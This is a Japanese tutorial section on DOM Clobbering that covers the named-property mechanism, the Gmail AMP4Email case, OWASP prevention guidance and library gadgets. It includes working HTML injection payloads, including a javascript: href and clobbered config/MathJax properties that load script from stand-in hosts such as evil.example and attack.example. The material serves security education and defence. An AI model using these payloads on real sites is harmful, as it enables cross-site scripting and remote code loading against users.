## DOM Clobbering

### 概要:「スクリプトなしのXSS」という矛盾

DOM Clobbering(DOMクロベリング)は、`<script>`タグや`javascript:`スキームなど、いわゆる「スクリプト」を一切使わずに、HTMLマークアップの注入だけでJavaScriptの実行フローを乗っ取る攻撃手法です。多くの防御策(HTMLサニタイザ、CSPのscript-src制限)は「スクリプトの実行を防ぐ」ことに主眼を置いていますが、DOM Clobberingはスクリプトを実行するのではなく、既存の正規スクリプトが参照する変数やプロパティの「値」を、HTML要素で意図的に上書き(clobber)します。結果として、開発者が「ここは安全な組み込みAPIか、まだ未定義の変数のはずだ」と信じているオブジェクトが、攻撃者の用意した`<a>`や`<form>`要素にすり替わり、最終的に`innerHTML`への代入やスクリプトの動的ロードなど、危険なsink(入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`、`eval()`、`script.src`)に攻撃者の値が流れ込みます。

本節では、この攻撃が成立する仕組み(ブラウザの「名前付きプロパティ」機構)を核として、実際に野生で発見された脆弱性(Gmail AMP4Email)、体系化された防御策(OWASP)、そして研究コミュニティが収集した実例集(DOM Clobbering Collection)の3つの資料をもとに、原理から実践までを解説します。

### 仕組みの核心:名前付きプロパティアクセス(Named Property Access)

DOM Clobberingを理解する鍵は、HTML仕様(WHATWG HTML Standard)が定義する「**名前付きプロパティ可視性アルゴリズム(named property visibility algorithm)**」です。ブラウザはDOMツリーを構築する際、`id`または`name`属性を持つ一部のHTML要素について、その値をキーとして`document`オブジェクトおよび(条件付きで)`window`オブジェクトに自動的にアクセサを生やします。

```html
<form id="x"></form>
```

このHTMLがページに存在するだけで、JavaScript側では以下がすべて成立します。

```js
document.x   // <form id="x">要素を参照
window.x     // 同上(グローバルスコープにxという変数が未宣言の場合)
x            // グローバル変数として同上
```

> なぜ動くか: HTML仕様が`HTMLDocument`と`Window`インターフェースに「名前付きプロパティ」というブラウザ組み込みの仕組みを定義しており、`id`/`name`属性を持つ要素が自動的にそのプロパティ値として登録されるため。これはJavaScriptの通常の変数宣言とは無関係に、パーサがHTMLを解釈した時点で発生する。

重要なのは、**この名前付き要素参照が、開発者が明示的に宣言していない変数(未定義のグローバル変数)よりも先に、あるいはそれに代わって解決される**という点です。たとえばコードが

```js
let redirectTo = window.redirectTo || '/profile/';
location.assign(redirectTo);
```

のように「`window.redirectTo`が定義されていればそれを使い、なければデフォルト値を使う」という一見安全なロジックを書いていたとしても、攻撃者が事前にHTMLインジェクションで

```html
<a id="redirectTo" href="javascript:alert(document.domain)"></a>
```

を注入していれば、`window.redirectTo`は文字列ではなく**この`<a>`要素そのもの**(`HTMLAnchorElement`オブジェクト)になります。この要素はtruthyな値であるため`||`の右辺には進まず、`location.assign()`に要素オブジェクトが渡されます。多くのブラウザAPIはオブジェクトを暗黙的に`toString()`し、`HTMLAnchorElement`の`toString()`は`href`属性の値(絶対URL化されたもの)を返すため、結果として`location.assign("javascript:alert(document.domain)")`相当の呼び出しが発生し、XSSが成立します。

もう一つの典型パターンとして、ネストした`id`属性による「オブジェクトのプロパティまで汚染する」テクニックがあります。

```html
<a id="config"></a>
<a id="config" name="url" href="https://evil.example/malicious.js"></a>
```

> なぜ動くか: 同じ`id`を持つ要素が複数存在する場合、ブラウザは`HTMLCollection`(疑似配列)を`document.config`として返す。さらにその`HTMLCollection`に対して`name`属性で追加のプロパティアクセスが定義されるため、`document.config.url`のようなネストしたプロパティパスまで攻撃者が構築できる。これにより`window.config.url || 'script.js'`のような「設定オブジェクトのプロパティを読む」コードまで乗っ取り可能になる。

コードが

```js
var s = document.createElement('script');
let src = window.config.url || 'script.js';
s.src = src;
document.body.appendChild(s);
```

のようにconfigオブジェクトのプロパティから動的スクリプトのURLを決定していた場合、上記の注入により任意のリモートJavaScriptを読み込ませることができ、HTMLインジェクションのみからフルのコード実行(XSS)に到達します。

### 攻撃が成立する前提条件

DOM Clobberingは万能ではなく、以下の条件が揃って初めて成立します。

1. **スクリプトタグの直接注入ができない状況であること**: サニタイザやCSPによって`<script>`や`on*`属性、`javascript:`スキームは弾かれるが、`<a>`や`<form>`、`<img>`のような一見無害なタグの`id`/`name`属性は許可されている、という「中途半端なサニタイズ」の場面で威力を発揮します。
2. **ターゲットのJavaScriptコードが、グローバルスコープの変数・組み込みAPI・`document`/`window`のプロパティを「型チェックなしに」信頼して使っていること**。特に、変数が「まだ定義されていないかもしれない」という前提で`||`や`??`によるデフォルト値パターンを書いているコードは典型的な標的です。
3. **開発者が「名前付きプロパティ」というブラウザの挙動そのものを認識していないこと**。これは言語仕様のグレーゾーンであり、通常のセキュアコーディング教育では見落とされがちです。

### 実例1: Gmail AMP4EmailにおけるDOM Clobbering(Michał Bentkowski, Securitum)

> ⚠️ **未取得の資料**: 「XSS in GMail's AMP4Email via DOM Clobbering」(Securitum, Michał Bentkowski)は自動取得できませんでした(理由: 対象ドメイン`research.securitum.com`が本環境のegressプロキシによりブロックされているため)。以下のURLからユーザーご自身で直接ご覧ください: https://research.securitum.com/xss-in-amp4email-dom-clobbering/

(以下は未取得資料の補足として、Web検索で得られた二次情報および一般知識に基づく解説です)

2019年8月、セキュリティ研究者Michał Bentkowski(Securitum)は、GmailのAMP4Email(「ダイナミックメール」とも呼ばれる、メール本文にAMP HTMLを埋め込んで動的コンテンツを表示できるGoogleの機能)においてDOM ClobberingによるXSSを発見し、Google Vulnerability Reward Program(VRP)に報告しました。Googleは2019年10月12日までに修正を完了し、Bentkowskiは2019年11月18日に詳細を公開、報奨金5,000ドルを獲得しています。

AMP4Emailは、メール本文というきわめて信頼できない入力(送信者が完全に内容を制御できる)からHTMLを描画するにもかかわらず動的な挙動を許すという、構造的にリスクの高い機能でした。そのためGoogleはあらかじめDOM Clobbering対策として、`id`属性に`"AMP"`のような特定の予約語を使うことを**禁止するフィルタ**を実装していました。これは「AMPランタイムの内部変数名を`id`属性で上書きされる」典型的なDOM Clobberingを防ぐ意図です。

しかし、Bentkowskiはこのフィルタが`"AMP"`という文字列は弾くものの、`"AMP_MODE"`という別の内部識別子までは想定していないことを発見しました。攻撃者が

```html
<a id="AMP_MODE"></a>
```

を注入すると、AMPランタイム内部で`AMP_MODE`というグローバル変数(本来はAMPの実行モード情報を保持するオブジェクト)にアクセスしようとした際、それが`<a>`要素にclobberされ、その結果としてAMPが動的スクリプトを読み込むためのURL構築ロジックの一部が`undefined`という文字列を含んだまま実行され、コンソールにスクリプト読み込みエラー(URLの一部が`undefined`になっている404エラー)が出力されました。

> なぜ動くか: `AMP_MODE`という名前は、開発者が「絶対に外部から上書きされない内部変数」だと想定していたが、それは単なる`window`スコープの変数であり、DOM Clobberingの対象になり得た。フィルタは既知の危険な識別子(`"AMP"`)だけをブロックリスト方式で防いでおり、関連する別の内部識別子(`AMP_MODE`)を見落としていた。ブロックリスト型の防御は、対象システムの内部実装(変数名の全体像)を完全に把握できない限り漏れが生じるという典型例。

Bentkowskiはさらに研究を進め、`AMP_MODE.test`と`AMP_MODE.localDev`という2つのプロパティを共にtruthyにし、加えて`window.testLocation`という別の変数もclobberすることで、AMPランタイムに「これはテスト/ローカル開発環境である」と誤認させ、本来は運用環境では読み込まれないはずの任意のリモートJavaScriptファイルを読み込ませる経路を構築しました。複数のDOM要素(`id`と`name`の組み合わせ)を巧妙に配置することで、単一の変数だけでなく、条件分岐を成立させる複数の関連プロパティを同時にclobberするというテクニックです。

最終的にこの脆弱性は理論上フルのXSSに到達するものでしたが、実際の攻撃としてはAMPコンテンツに対して別途デプロイされていたContent-Security-Policy(CSP)によってコード実行そのものは緩和されていた、という点も報告されています。この事例は、DOM Clobberingを見つけた後に「それが本当にコード実行まで到達するか」を確認する多層防御(CSPなど)の重要性も同時に示しています。

> 出典: XSS in GMail's AMP4Email via DOM Clobbering — https://research.securitum.com/xss-in-amp4email-dom-clobbering/ (二次情報: SecurityWeek, sekurak.pl 等の報道に基づく要約)

### 資料2: OWASP DOM Clobbering Prevention Cheat Sheet

> ⚠️ **未取得の資料の補足について**: `cheatsheetseries.owasp.org`への直接アクセスは本環境のegressプロキシでブロックされましたが、OWASP CheatSheetSeriesリポジトリのGitHub上のMarkdown原本(raw.githubusercontent.com経由)を取得できたため、内容は反映されています。念のため一次情報は以下のURLからも参照できます: https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html

OWASPのこのチートシートは、DOM Clobberingの定義を「攻撃者が、セキュリティ上重要な変数やブラウザAPIと**同じ`id`または`name`属性**を持つHTML要素を注入することで、その値を意図的に上書きする攻撃」と整理し、13項目の防御ガイドラインを2つのグループに分けて提示しています。

**グループA: 技術的対策(実行環境・ツールでの緩和)**

- **HTMLサニタイザの適切な設定**: DOMPurifyを使う場合、`SANITIZE_NAMED_PROPS`オプションを有効化すると、`id`/`name`属性の値に`user-content-`のようなプレフィックスが自動付与され、名前空間の衝突を防げます。

```js
DOMPurify.sanitize(dirty, { SANITIZE_NAMED_PROPS: true });
```

> なぜ動くか: 属性値そのものを書き換えてしまえば、攻撃者が`id="redirectTo"`のような「狙った名前」を注入しても、実際にDOMへ反映される値は`id="user-content-redirectTo"`のように変形され、コード側が参照する変数名と一致しなくなるため、名前付きプロパティの衝突が起こらなくなる。

- **CSPの活用**: `script-src`によるスクリプト読み込み元の制限は、DOM Clobberingを起点として「外部スクリプトを動的に読み込ませる」タイプの攻撃(前述のconfig.url例)を緩和できます。ただし、`eval()`やテンプレートエンジンのコード評価構造を悪用するタイプのDOM Clobbering(スクリプトの新規ロードを伴わない、既存コードのロジック改変)には効果がありません。
- **重要なオブジェクトの凍結**: `Object.freeze(window)`のように重要なグローバルオブジェクトを不変化する手法もありますが、保護すべき対象を漏れなく洗い出すことは実務上困難です。

**グループB: セキュアコーディングの実践**

- **明示的な変数宣言**(`var`/`let`/`const`の徹底): ただし、興味深いことに`let`で宣言したブロックスコープ変数であっても、**`window.VARNAME`という形でのDOM Clobberingから完全には保護されない**とされています。これは`let`がグローバルの`window`オブジェクトのプロパティにはならない一方で、コードが`window.VARNAME`のように明示的に`window`経由でアクセスしていれば、依然としてclobberされたプロパティを読んでしまうためです。
- **`document`/`window`をグローバルな値の保存先に使わない**: これらのオブジェクトはHTMLの構造次第でいつでも改変されうる「信頼できない共有状態」であるため。
- **組み込みAPIであっても無条件に信頼しない**: 名前付きプロパティ可視性アルゴリズムにより、ブラウザ組み込みのプロパティやメソッドさえもDOM要素によって上書きされうるため、値を使う前に検証が必要です。
- **型チェックの実装**(`instanceof`): clobberされた値は必ず`Element`(または`HTMLCollection`)のインスタンスになるため、

```js
if (window.config instanceof HTMLElement) {
  // clobberされている可能性が高いので使わない
}
```

のように期待する型(文字列、プレーンオブジェクトなど)と実際の型を照合することで検出・防御できます。
- **strictモードの有効化**: 意図しないグローバル変数の暗黙的な生成を防ぎ、読み取り専用プロパティへの代入時に例外を発生させることで、一部のclobbering起因のバグを早期に顕在化させます。
- **ブラウザの機能検出を先に行う**: 未対応ブラウザでは該当APIが`undefined`のままになるため、そこがclobberingの標的になりやすい。事前にfeature detectionを行い、未定義を前提としたロジックを減らすことが推奨されます。
- **変数のスコープを可能な限りローカルに限定する**、**カプセル化(クラスやクロージャによるプライベート化)**、**本番環境でのユニークな変数名の採用**も、いずれも「グローバルな名前空間の衝突面」を減らすという同じ原理に基づく対策です。

このチートシートが強調する最も重要な結論は、「名前付きプロパティアクセスの優先順位はブラウザの仕様であり、Webアプリケーション側で変更することはできない」という点です。つまり防御は「衝突が起きないように名前空間を守る」か「衝突が起きても実害が出ないように値を検証する」という**回避戦略**に本質的に依存します。

> 出典: DOM Clobbering Prevention Cheat Sheet (OWASP CheatSheetSeries) — https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html

### 資料3: DOM Clobbering Collection(研究/ガジェット集)

`jackfromeast/dom-clobbering-collection`は、実際のクライアントサイドライブラリに存在したDOM Clobbering可能な「ガジェット」(clobberingを使って到達可能な、危険なコードパス)と、それに関連するHTMLインジェクション脆弱性を体系的に収集したリポジトリです。研究時点でDOM Clobberingガジェットが35件、関連するHTML Injection脆弱性が12件記録されており、影響を受けたライブラリにはビルドツール(Vite、Webpack、Astro、rollup)、数式レンダリングライブラリ(MathJax v2/v3)、シンタックスハイライトライブラリ(Prism)、Googleの共通ライブラリ(Closure Library)などが含まれます。

代表的なガジェット例:

```html
<img src="https://attack.example/x" name="currentScript">
```

> なぜ動くか: 一部のビルドツールが生成するランタイムコードは、現在実行中の`<script>`要素の情報を`document.currentScript`から取得してモジュール解決の基準パスを決めることがある。しかし`currentScript`もまた名前付きプロパティの対象になりうる名前であり、ページ内に`name="currentScript"`を持つ`<img>`などの要素が存在すると、`document.currentScript`がその偽の要素にclobberされ、ライブラリが本来のスクリプトタグではなく攻撃者の`src`情報を「現在のスクリプト」として誤認してしまう。これによりモジュールの読み込み元パスが操作可能になる。

```html
<form name="scripts">alert(1)</form><form name="scripts">alert(1)</form>
```

> なぜ動くか: 同名の`<form>`要素を複数配置すると、`document.scripts`(本来はページ内の`<script>`要素一覧を返す組み込みのライブコレクション)が、名前付きプロパティの解決順位により`HTMLCollection`(自作フォーム集合)にすり替わる。ライブラリが「`document.scripts`は常にScript要素のコレクションだ」と無条件に信じて反復処理などを行っていると、意図しないオブジェクトを処理させられ、ロジックの破綻や後続のXSSにつながる。

```html
<a id="MathJax"></a> <a id="MathJax" name="root" href="https://attack.example"></a>
```

> なぜ動くか: MathJaxは初期化時にグローバルな`MathJax`オブジェクト(設定やルートパスを保持)を参照するが、これも変数名の衝突対象になる。`id`が重複した`<a>`要素で`HTMLCollection`を作り、その中の`name="root"`要素で`.root`プロパティを持たせることで、MathJaxが期待する「設定オブジェクトの`root`プロパティ(スクリプトの読み込みベースパス)」を攻撃者のURLにすり替え、任意のリモートスクリプトを読み込ませることができる。

このリポジトリが示す実務上の教訓は次の3点に整理できます。

1. **影響の多くはXSS(30件超)だが、CSRFも一定数観測されている**(plausible-analyticsやplotly.jsなど)。これはDOM Clobberingが「JavaScriptの意思決定ロジックを狂わせる」攻撃全般に応用可能であり、XSSに限定されないことを示します。
2. **多くのケースで根本原因はライブラリ側の「グローバル状態への暗黙の依存」**であり、mermaidやtui.editorのように、事後的にDOMPurifyのようなサニタイザを組み込むことで修正されています。
3. **一部のライブラリ(plausible-analytics、plotly.js、Prismなど)は報告後も未修正のまま**とされており、DOM Clobberingは「理論上は昔から知られているが、実際のライブラリでの対策は依然として発展途上」という現在進行形の脅威であることが読み取れます。

> 出典: dom-clobbering-collection — https://github.com/jackfromeast/dom-clobbering-collection

### まとめ

DOM Clobberingは、スクリプトの実行そのものを禁止するサニタイザやCSPだけでは防ぎきれない、**ブラウザの名前付きプロパティ解決という仕様レベルの挙動**を悪用する攻撃です。攻撃者はHTMLタグの`id`/`name`属性という一見無害な入力だけで、JavaScriptが信頼している変数・組み込みAPI・設定オブジェクトのプロパティをすり替え、最終的にはスクリプトの動的ロードやURLベースのsinkを通じてXSSやCSRFに到達させます。Gmail AMP4Emailの事例が示すように、ブロックリスト方式のフィルタは内部実装の全体像を把握しない限り漏れが生じやすく、防御側は「名前空間の汚染を防ぐ」(サニタイザでの属性値変形、命名規則の統一)と「値を使う前に型を検証する」(`instanceof`によるチェック)の両輪で対策する必要があります。
